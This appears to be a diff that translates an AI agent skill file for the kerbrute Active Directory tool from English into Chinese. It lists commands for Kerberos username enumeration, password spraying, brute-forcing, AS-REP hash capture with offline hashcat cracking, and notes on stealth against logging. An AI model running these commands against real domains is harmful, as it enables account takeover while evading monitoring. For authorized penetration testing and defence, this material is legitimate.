@@ -1,82 +1,75 @@
 ---
 name: kerbrute
 description: >
-  This skill should be used when the user asks about "kerbrute", "enumerate
-  valid AD usernames via Kerberos pre-auth", "perform password spraying
-  against AD", "brute-force a specific user's password", "identify valid
-  accounts without triggering standard auth logs". Kerberos-based user
-  enumeration and password spraying tool for Active Directory.
+  此技能适用于用户询问关于"kerbrute"、"通过 Kerberos 预认证枚举有效 AD 用户名"、"对 AD 执行密码喷洒"、"暴力破解特定用户密码"、"在不触发标准认证日志的情况下识别有效账号"。基于 Kerberos 的 Active Directory 用户枚举和密码喷洒工具。
 ---
 
 # Kerbrute
 
-Fast Kerberos user enumeration and password spraying — leverages Kerberos pre-auth errors for stealthy enumeration.
+快速 Kerberos 用户枚举和密码喷洒 — 利用 Kerberos 预认证错误实现隐蔽枚举。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Enumerate valid users
+# 枚举有效用户
 kerbrute userenum -d domain.local --dc dc.domain.local users.txt
 
-# Password spray
+# 密码喷洒
 kerbrute passwordspray -d domain.local --dc dc.domain.local users.txt "Password123"
 
-# Brute-force single user
+# 暴力破解单个用户
 kerbrute bruteuser -d domain.local --dc dc.domain.local passwords.txt john.doe
 ```
 
-## Sub-commands
+## 子命令
 
-| Command | Description |
-|---------|-------------|
-| `userenum` | Enumerate valid usernames via Kerberos pre-auth |
-| `passwordspray` | Spray a single password against many users |
-| `bruteuser` | Brute-force a single user's password |
-| `bruteforce` | Brute-force user\:password pairs from file |
+| 命令 | 说明 |
+|------|------|
+| `userenum` | 通过 Kerberos 预认证枚举有效用户名 |
+| `passwordspray` | 对多个用户喷洒单个密码 |
+| `bruteuser` | 暴力破解单个用户的密码 |
+| `bruteforce` | 从文件中暴力破解 user\:password 对 |
 
-## Core Flags
+## 核心参数
 
-| Flag | Description |
-|------|-------------|
-| `-d <domain>` | Target domain (e.g., `domain.local`) |
-| `--dc <dc>` | Domain controller IP or hostname |
-| `-t <n>` | Threads (default 10) |
-| `-o <file>` | Output valid accounts to file |
-| `--hash-file <file>` | Output found hashes to file (AS-REP roasting) |
-| `--downgrade` | Force RC4 (weaker) encryption |
-| `-v` | Verbose |
-| `--safe` | Lock out protection (stop at 3 failures per user) |
-| `--delay <ms>` | Delay between requests (milliseconds) |
+| 参数 | 说明 |
+|------|------|
+| `-d <domain>` | 目标域（如 `domain.local`） |
+| `--dc <dc>` | 域控制器 IP 或主机名 |
+| `-t <n>` | 线程数（默认 10） |
+| `-o <file>` | 将有效账号输出到文件 |
+| `--hash-file <file>` | 将找到的哈希输出到文件（AS-REP roasting） |
+| `--downgrade` | 强制使用 RC4（较弱）加密 |
+| `-v` | 详细输出 |
+| `--safe` | 锁定保护（每个用户失败 3 次后停止） |
+| `--delay <ms>` | 请求间延迟（毫秒） |
 
-## Common Workflows
+## 常用工作流
 
 ```bash
-# User enumeration from a username list
+# 从用户名列表枚举用户
 kerbrute userenum -d corp.local --dc 10.10.10.1 usernames.txt -o valid_users.txt -v
 
-# Generate usernames from a name list first
-# e.g., john.doe, jdoe, johnd, etc.
+# 先生成用户名（如 john.doe、jdoe、johnd 等）
 
-# Safe password spray (avoid lockouts)
+# 安全密码喷洒（避免锁定）
 kerbrute passwordspray -d corp.local --dc 10.10.10.1 valid_users.txt "Spring2024!" \
   --safe --delay 1000
 
-# Get AS-REP hashes for users without pre-auth (then crack offline)
+# 获取未启用预认证用户的 AS-REP 哈希（随后离线破解）
 kerbrute userenum -d corp.local --dc 10.10.10.1 users.txt --hash-file asrep_hashes.txt
-# Crack with hashcat: hashcat -a 0 -m 18200 asrep_hashes.txt rockyou.txt
+# 使用 hashcat 破解：hashcat -a 0 -m 18200 asrep_hashes.txt rockyou.txt
 
-# Combined spray + extract
+# 组合喷洒 + 提取
 kerbrute bruteforce -d corp.local --dc 10.10.10.1 user_pass_pairs.txt
 ```
 
-## Detection
+## 检测说明
 
-Kerbrute generates **KDC_ERR_C_PRINCIPAL_UNKNOWN** errors for invalid users (event 4768 not generated). Valid user hits produce **KDC_ERR_PREAUTH_FAILED** (logged as 4771). Much stealthier than LDAP enumeration.
+Kerbrute 对无效用户产生 **KDC_ERR_C_PRINCIPAL_UNKNOWN** 错误（不生成事件 4768）。有效用户命中时产生 **KDC_ERR_PREAUTH_FAILED**（记录为 4771）。比 LDAP 枚举隐蔽得多。
 
-## Resources
+## 参考资源
 
-| File | When to load |
-|------|--------------|
-| `references/attacks.md` | Kerberos attack chain (AS-REP roasting, Kerberoasting), username generation, detection evasion |
-
-## Structuring This Skill
+| 文件 | 加载时机 |
+|------|----------|
+| `references/attacks.md` | Kerberos 攻击链（AS-REP roasting、Kerberoasting）、用户名生成、检测规避 |
